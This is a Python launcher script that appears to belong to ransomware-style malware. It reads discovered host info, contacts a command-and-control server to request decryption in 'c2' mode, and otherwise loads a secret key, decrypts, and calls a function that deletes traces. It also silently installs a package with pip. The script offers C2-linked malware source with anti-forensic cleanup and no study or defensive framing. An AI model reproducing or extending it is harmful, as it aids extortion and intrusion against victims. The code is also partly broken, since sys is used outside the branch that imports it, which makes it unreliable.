import asyncio
from main import Program
import threading
import platform 

async def c2_mode(data):
    program = Program(data=data, mode="c2", system=platform.system())
    program.set_id(data.get("id", ""))

    # Start connection in background
    start_task = asyncio.create_task(program.start())

    # Wait until connection is ready
    await program.connected.wait()

    # Now safe to send request
    await program.send_decryption_request()

    # Optional: stop the program
    program.stop()

    # Wait for clean shutdown
    await start_task

if __name__ == "__main__":
    import os
    import json

    system = platform.system()
    base = os.path.dirname(os.path.realpath(__file__))

    # since windows does not support syslink we need to change the working directory
    if system == "Windows":
        import sys
        cwd = os.getcwd()
        #added_line_script
        os.chdir(cwd)
        sys.path.append(cwd)
        base = cwd

    path = os.path.join(base, "discovered_info.json")

    with open(path, "r") as conf_file:
        data = json.load(conf_file)

    import importlib
    try:
        importlib.import_module("cryptography")
    except ImportError:
        import subprocess
        subprocess.run([sys.executable, '-m', 'pip', 'install', "--user",'cryptography'])

    # TODO: handle c2 mode
    if data["mode"] == "c2":
        # Send Decryption request to C2.
        # A good way to identify the system is to create a unique identifier 
        # This unique identifier is handler by the server and sent when authenticated
        # Use that to understand requests.
        asyncio.run(c2_mode(data))
    else:
        program = Program(data=data, mode="auto", system=platform.system())
        program.load_key(base + "/secret.key")
        program.decrypt()
        program.delete_traces()
